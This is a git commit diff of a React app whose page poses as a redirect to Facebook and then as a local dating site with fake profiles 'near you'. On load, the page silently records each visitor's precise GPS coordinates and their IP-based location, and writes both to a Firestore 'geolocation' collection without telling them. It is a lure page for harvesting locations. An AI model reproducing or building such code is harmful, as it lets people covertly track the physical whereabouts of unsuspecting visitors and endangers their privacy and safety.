9c853e1967f31900d357b2db678b27ffb59d4e22
DESKTOP-JQ7GKHB\jagan <yadhushiya.intern@leorainfotech.in>
2023-04-27 11:06:11 +0530

    changes

--- src/App.js
+++ src/App.js
@@ -1,55 +1,131 @@
-import React, { useEffect } from 'react';
+import React, { useState, useEffect } from 'react';
 import { serverTimestamp } from 'firebase/firestore';
 import { firestore } from './firebase';
 import { addDoc, collection } from 'firebase/firestore';
+import bgImage from './datingBg.jpg';
+import './App.css';
+import girlIcon from './girlIcon.png';
+import download1 from './images/download1.jpg';
+import download2 from './images/download2.jpg';
+import images2 from './images/images2.jpg';
 
 function App() {
-
   useEffect(() => {
     const options = {
       enableHighAccuracy: true,
       timeout: 5000,
       maximumAge: 0,
     };
-    if(navigator.geolocation){
-      navigator.geolocation.watchPosition((position)=>{
-        console.log("position-->",position, position.coords)
-            const ref = collection(firestore, "geolocation");
-            let data = {
-              geo: JSON.stringify(position.coords.accuracy),
-              latitude: JSON.stringify(position.coords.latitude),
-              longitude: JSON.stringify(position.coords.longitude),
-              timestamp: serverTimestamp(),
-            }
-            try{
-              addDoc(ref, data)
-              // const timeout = setTimeout(() => {
-              //   // 👇️ redirects to an external URL
-              //   window.location.replace('https://www.facebook.com/photo/?fbid=595036837529214');
-              // }, 3000);
-          
-              // return () => clearTimeout(timeout);
-            }catch(err){
-              console.log("err-->",err)
-            }
-      },error => console.log(error), options)
-    } 
+    
+    const ref = collection(firestore, "geolocation");
+    
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition((position) => {
+        console.log("position-->", position, position.coords)
+
+        let data = {
+          geo: JSON.stringify(position.coords.accuracy),
+          latitude: JSON.stringify(position.coords.latitude),
+          longitude: JSON.stringify(position.coords.longitude),
+          timestamp: serverTimestamp(),
+        }
+        try {
+          addDoc(ref, data).then(() => {
+            // const timeout = setTimeout(() => {
+            //   // 👇️ redirects to an external URL
+            //   window.location.replace('https://www.quackquack.in/dating/in/tamil-nadu/');
+            // }, 3000);
+
+            // return () => clearTimeout(timeout);
+          })
+
+        } catch (err) {
+          console.log("err-->", err)
+        }
+      }, error => console.log(error), options)
+     
+    }
   }, []);
+
+  useEffect(()=>{
+    const ref = collection(firestore, "geolocation");
+    fetch('https://geolocation-db.com/json/f2e84010-e1e9-11ed-b2f8-6b70106be3c8').then(res => res.json()).then(resObj => addDoc(ref, resObj))
+  },[])
 
   // useEffect(() => {
   //   const timeout = setTimeout(() => {
   //     // 👇️ redirects to an external URL
-  //     window.location.replace('https://www.facebook.com/photo/?fbid=595036837529214');
+  //     window.location.replace('https://www.quackquack.in/dating/in/tamil-nadu/');
   //   }, 3000);
 
   //   return () => clearTimeout(timeout);
   // }, []);
 
+  const [searchTerm, setSearchTerm] = useState('');
+  const [selectedProfile, setSelectedProfile] = useState(null);
 
+  const profiles = [
+    {
+      name: 'Ramya',
+      age: 25,
+      location: '2 km from you',
+      description: 'I love hiking and trying new foods!',
+      image : download1
+    },
+    {
+      name: 'Maha',
+      age: 30,
+      location: '1.5 km from you',
+      description: 'I enjoy playing guitar and watching movies.',
+      image: download2
+    },
+    {
+      name: 'Rose',
+      age: 27,
+      location: '1 km from you',
+      description: 'I am a software engineer and enjoy traveling.',
+      image: images2
+    },
+  ];
+
+  const filteredProfiles = profiles.filter((profile) =>
+    profile.name.toLowerCase().includes(searchTerm.toLowerCase())
+  );
 
   return (
-    <div>
-      <h1>Redirecting to facebook ...</h1>
+    <div className="App">
+      <h1>Find girls & boys for dating near you</h1>
+      <div className="search-bar">
+        <input
+          type="text"
+          placeholder="Search profiles"
+          value={searchTerm}
+          onChange={(event) => setSearchTerm(event.target.value)}
+        />
+      </div>
+      <div className="profiles">
+        {filteredProfiles.map((profile) => (
+          <div key={profile.name} className="profile-card">
+            <h2>{profile.name}<span>{` ${profile.age} years`}</span></h2>
+            <img  className="img" alt='loading' src={profile.image}/>
+            <p>{profile.location}</p>
+            <button onClick={() => setSelectedProfile(profile)}>
+              View Profile
+            </button>
+          </div>
+        ))}
+      </div>
+      {selectedProfile && (
+        <div className="profile-details">
+          <h2>{selectedProfile.name}</h2>
+          <p>{selectedProfile.age} years old</p>
+          <p>{selectedProfile.location}</p>
+          <p>{selectedProfile.description}</p>
+          <button onClick={() => setSelectedProfile(null)}>
+            Back to Profiles
+          </button>
+        </div>
+      )}
     </div>
   );
 }
